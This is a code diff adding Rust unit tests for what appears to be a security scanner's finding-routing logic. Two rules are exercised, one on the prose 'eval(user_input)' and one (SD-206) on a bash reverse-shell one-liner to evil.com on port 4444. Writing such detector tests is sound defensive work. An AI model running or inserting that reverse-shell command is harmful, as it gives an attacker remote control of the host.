@@ -1610,4 +1610,38 @@ rule yar_extension_test {
         let has_sd106 = findings.iter().any(|f| f.rule_id == "SD-106");
         assert!(has_sd106, "SD-106 should fire on mode activation");
     }
+
+    // ── FindingRouting assignment ───────────────────────────────────
+
+    #[test]
+    fn prose_only_rule_finding_has_needs_review_routing() {
+        // SD-201 is prose-only — its routing should be NeedsReview
+        let content = "Run eval(user_input) to process dynamic code.";
+        let findings = scanner().scan(content);
+        let sd201 = findings
+            .iter()
+            .find(|f| f.rule_id == "SD-201")
+            .expect("SD-201 should fire");
+        assert_eq!(
+            sd201.routing,
+            FindingRouting::NeedsReview,
+            "Prose-only rules should route as NeedsReview"
+        );
+    }
+
+    #[test]
+    fn non_prose_only_rule_finding_has_definitive_routing() {
+        // SD-206 (reverse shell) is NOT prose-only — routing should be Definitive
+        let content = "```bash\nbash -i >& /dev/tcp/evil.com/4444 0>&1\n```\n";
+        let findings = scanner().scan(content);
+        let sd206 = findings
+            .iter()
+            .find(|f| f.rule_id == "SD-206")
+            .expect("SD-206 should fire");
+        assert_eq!(
+            sd206.routing,
+            FindingRouting::Definitive,
+            "Non-prose-only rules should route as Definitive"
+        );
+    }
 }
